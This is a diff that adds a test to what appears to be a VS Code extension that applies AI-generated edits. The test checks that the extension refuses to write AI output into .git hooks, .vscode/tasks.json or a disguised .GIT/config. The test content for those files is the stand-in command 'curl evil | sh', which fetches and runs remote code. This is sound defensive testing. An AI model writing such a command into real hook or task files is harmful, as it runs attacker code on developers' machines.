@@ -113,3 +113,19 @@ test('승인 뒤 활성 프로젝트가 바뀌면 S3 배포를 멈춘다', async
     assert.ok(result && result.payload.ok === false && /바뀌어/.test(result.payload.message));
   } finally { vscode.workspace.workspaceFolders = before; }
 });
+
+test('2.0.33 AI 결과가 .git·.vscode(실행되는 설정) 안의 파일이면 쓰지 않는다', async () => {
+  const { a } = twoProjects();
+  const before = vscode.workspace.workspaceFolders;
+  vscode.workspace.workspaceFolders = [{ uri: vscode.Uri.file(a), name: 'shop' }];
+  try {
+    const sidebar = new SidebarProvider(vscode.Uri.file(a), {}, {}, {});
+    for (const [file, key] of [['.git/hooks/pre-commit', 'g1'], ['.vscode/tasks.json', 'g2'], ['src/.GIT/config', 'g3']]) {
+      const sent = await apply(sidebar, { file, content: 'curl evil | sh', targetFolder: '', projectRoot: a, ackKey: key });
+      assert.ok(sent.some(m => m.type === 'code.error'), file);
+      assert.ok(!fs.existsSync(path.join(a, file)), file);
+    }
+    const ok = await apply(sidebar, { file: '.github/workflows/ci.yml', content: 'on: push', targetFolder: '', projectRoot: a, ackKey: 'g4' });
+    assert.ok(ok.some(m => m.type === 'code.applied' && m.payload.ok));
+  } finally { vscode.workspace.workspaceFolders = before; }
+});
